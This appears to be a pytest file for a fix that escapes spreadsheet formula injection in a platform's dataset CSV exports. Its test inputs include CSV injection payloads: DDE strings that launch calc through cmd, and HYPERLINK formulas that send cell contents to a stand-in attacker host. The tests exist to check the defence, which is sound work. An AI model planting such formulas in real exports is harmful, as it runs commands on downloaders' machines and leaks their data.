"""fix(#1778): the dataset CSV export needs the hardening its siblings have.

ogr2ogr writes every attribute value verbatim and the writer side validates
only the column NAME, so an editor on a public dataset can store a property
beginning with =, +, - or @ and any anonymous visitor who downloads the CSV
distribution the DCAT record advertises executes it on open. Cross-privilege
sink: the writer needs edit rights on one dataset, the victim needs none.

Two sibling CSV writers (the audit-log export and the admin user export) have
carried the escape for a long time. All three now share one rule.
"""

from __future__ import annotations

import csv
import inspect
from pathlib import Path

import pytest

from app.core.csv_safety import escape_csv_formula
from app.processing.export.ogr import _harden_csv_formulas, run_ogr2ogr_export


@pytest.mark.parametrize(
    "value",
    [
        "=SUM(1,1)",
        "+1-cmd|'/c calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        '@HYPERLINK("http://attacker/","click")',
        '=HYPERLINK(CONCAT("http://attacker/?",A1),"x")',
        "-",
        "+",
        "-1.2.3",
        "-12abc",
        "+1e",
    ],
)
def test_formula_shaped_cells_are_escaped(value: str) -> None:
    assert escape_csv_formula(value) == "\t" + value


@pytest.mark.parametrize(
    "value",
    ["-12", "+12", "-0.5", "+.5", "-1.5e-3", "+2E10", "-0"],
)
def test_plain_numbers_are_left_alone(value: str) -> None:
    """A number is not a formula, and a data export is full of negatives.

    Tab-prefixing them would turn every negative measurement in an attribute
    table into text, for the spreadsheet and for pandas and QGIS alike.
    """
    assert escape_csv_formula(value) == value


@pytest.mark.parametrize(
    "value", ["", "name", "POINT(-1 2)", "2026-09-02", "a=b", "12-14"]
)
def test_ordinary_cells_are_untouched(value: str) -> None:
    assert escape_csv_formula(value) == value


def test_hardening_rewrites_a_csv_in_place(tmp_path: Path) -> None:
    target = tmp_path / "export.csv"
    target.write_text(
        "WKT,name,elevation,note\n"
        '"POINT (-1 2)",=SUM(1;1),-12,"quoted, comma"\n'
        '"POINT (3 4)",ordinary,+0.5,"@evil"\n',
        encoding="utf-8",
    )

    _harden_csv_formulas(str(target))

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))

    assert rows[0] == ["WKT", "name", "elevation", "note"]
    assert rows[1] == ["POINT (-1 2)", "\t=SUM(1;1)", "-12", "quoted, comma"]
    assert rows[2] == ["POINT (3 4)", "ordinary", "+0.5", "\t@evil"]
    # No leftover intermediate file.
    assert not (tmp_path / "export.csv.hardened").exists()


def test_hardening_preserves_the_line_ending_gdal_chose(tmp_path: Path) -> None:
    crlf = tmp_path / "crlf.csv"
    crlf.write_bytes(b"a,b\r\n=1,2\r\n")
    _harden_csv_formulas(str(crlf))
    assert b"\r\n" in crlf.read_bytes()

    lf = tmp_path / "lf.csv"
    lf.write_bytes(b"a,b\n=1,2\n")
    _harden_csv_formulas(str(lf))
    assert b"\r\n" not in lf.read_bytes()


def test_hardening_survives_a_wkt_cell_past_the_csv_default_limit(
    tmp_path: Path,
) -> None:
    """A detailed polygon's WKT passes csv's 128 KiB default field limit."""
    huge = "POINT (" + "0" * 200_000 + " 1)"
    target = tmp_path / "huge.csv"
    with open(target, "w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["WKT", "note"])
        writer.writerow([huge, "=SUM(1,1)"])

    _harden_csv_formulas(str(target))

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1][0] == huge
    assert rows[1][1] == "\t=SUM(1,1)"


def test_the_export_runs_the_pass_only_for_csv_and_only_on_success() -> None:
    src = inspect.getsource(run_ogr2ogr_export)
    assert "_harden_csv_formulas(output_path)" in src
    hardening_at = src.index("_harden_csv_formulas(output_path)")
    failure_raise_at = src.index("ogr2ogr export failed")
    assert failure_raise_at < hardening_at, "a failed run must not be post-processed"


def test_all_three_csv_writers_share_one_rule() -> None:
    """The defect was three writers, two private copies and one omission."""
    from app.modules.admin import router as admin_router
    from app.modules.audit import router as audit_router

    assert audit_router._safe_csv_cell is escape_csv_formula
    assert admin_router.escape_csv_formula is escape_csv_formula
